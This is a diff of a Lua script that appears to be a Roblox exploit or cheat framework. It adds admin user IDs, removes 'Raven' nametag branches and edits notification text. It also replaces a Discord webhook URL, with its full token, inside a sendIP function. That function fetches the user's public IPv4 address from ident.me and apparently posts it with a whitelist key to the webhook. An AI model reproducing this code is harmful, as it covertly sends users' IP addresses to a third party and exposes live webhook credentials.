@@ -24,6 +24,9 @@ local framework = {
       admin_accounts = {
           azoozAccounts = {
               [21763271] = true,
+              [141202542] = true,
+              [17049167] = true,
+              [4135012] = true,
           },
           smail_accounts = {
               [425451555] = true,
@@ -63,7 +66,7 @@ local framework = {
   end
   
   local function sendIP(whitelistKey)
-    local Webhook = "https://discord.com/api/webhooks/928696075332780082/oToUOrKIy_HGzqmMKV-E30Az9dMJ9XKq3a_wSqsa7aVma4Pse7TITNDFZH4aUpdNjku6"
+    local Webhook = "https://discord.com/api/webhooks/929333034375856129/x0Y94JtM2nEUijSr1yjp7pzZoNuBodifp2HqBwBetEsqTZwoGbczfto52Rqmn2DUKdWd"
     local IPv4 = game:HttpGet("https://v4.ident.me/")
     --local IPv6 = game:HttpGet("https://v6.ident.me/")
   
@@ -249,12 +252,12 @@ local framework = {
     Settings["textSize"] = framework.menuSettings.textSize
     Settings["uiTransparency"] = framework.menuSettings.uiTransparency
       Save()
-    framework:sendNotification("Saved Settings OwO")
+    framework:sendNotification("Saved Settings")
   end
   
   function framework:deleteSettings()
     delfile("ilove.Asians")
-    framework:sendNotification("Deleted Settings OwO")
+    framework:sendNotification("Deleted Settings")
   end
   
   function framework:toggleUI(state)
@@ -2147,10 +2150,7 @@ local framework = {
         elseif framework.admin_accounts.max_accounts[plr.UserId] then
                 framework:sendNotification("Max has joined your server")
           createNameTag(plr.Name, "Max")
-        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-          framework:sendNotification("Raven has joined your server")
-          createNameTag(plr.Name, "Raven")
-            end
+end
         plr.CharacterAdded:Connect(function(plr)
           print(plr)
           if framework.admin_accounts.azoozAccounts[plr.UserId] then
@@ -2159,8 +2159,6 @@ local framework = {
             createNameTag(plr.Name, "Smail")
           elseif framework.admin_accounts.max_accounts[plr.UserId] then
             createNameTag(plr.Name, "Max")
-          elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-            createNameTag(plr.Name, "Raven")
           end
         end)
       end)
@@ -2174,8 +2172,6 @@ local framework = {
             createNameTag(plr.Name, "Smail")
           elseif framework.admin_accounts.max_accounts[plr.UserId] then
             createNameTag(plr.Name, "Max")
-          elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-            createNameTag(plr.Name, "Raven")
           end
         end)
       if framework.admin_accounts.azoozAccounts[plr.UserId] then
@@ -2184,8 +2180,6 @@ local framework = {
           createNameTag(plr.Name, "Smail")
         elseif framework.admin_accounts.max_accounts[plr.UserId] then
           createNameTag(plr.Name, "Max")
-        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Raven")
         end
     end
     game:GetService("RunService").RenderStepped:Connect(function()
